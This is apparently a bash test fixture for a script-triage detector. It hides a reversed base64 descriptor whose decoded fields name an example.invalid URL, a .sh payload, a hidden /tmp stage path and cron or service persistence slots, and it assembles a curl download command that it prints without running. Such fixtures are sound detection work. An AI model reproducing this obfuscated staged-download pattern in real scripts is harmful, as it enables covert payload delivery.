#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_7dbd350a='NzFhMjFkZmMyOC1lZ2F0cy4vZWhjYWMtc3NlcnRudWgvcG10Lz1odGFwX2VsaWZ8NzFhMjFkZmMyOC9iYUxzc2VydG51SD10bmVnYV9yZXN1fGhzLmY4YjhiMjhmL2RpbGF2bmkuZWxwbWF4ZS43MWEyMWRmYzI4Ly86c3B0dGg9bHJ1fDcxYTIxZGZjMjgtbmdpYXBtYWM9ZGlfbmdpYXBtYWN8MT10bnVvY19lZ2F0c3x0dXB0dW9fbHJ1Yz1yZXRwYWRhfGVsaWZfZXRpcncsZXRvbWVyX2VyaXVxY2E9c3BldHN8MT12'
  readonly Codec_7dbd350a='base64_literal|reverse_bytes|'

  Load_7dbd350a() {
    item1=()
    local item6
    while read -r item6; do [[ -n "$item6" ]] && item1+=("$item6"); done < <(printf '%s' "${Material_7dbd350a}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
  }

  Decode_7dbd350a() {
    item2=()
    local item5
    for ((item5=0; item5<${#item1[@]}; item5++)); do
      item2[${#item1[@]}-1-item5]="${item1[item5]}"
    done
  }

  Recover_7dbd350a() {
    local -a item1 item2
    local item3 item4 item8 item5
    item4=$((19 * 7 - 133))
    Load_7dbd350a
    for item8 in 1; do Decode_7dbd350a; done
    item3=''
    local octal character
    for item5 in "${!item2[@]}"; do
      printf -v octal '%03o' "${item2[item5]}"
      printf -v character '%b' "\\$octal"
      item3+="$character"
    done
    printf '%s\n' "$item3"
  }

  Inspect_7dbd350a() { Recover_7dbd350a; }

  Plan_7dbd350a() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_7dbd350a)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")
    declare -p request_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_7dbd350a; fi
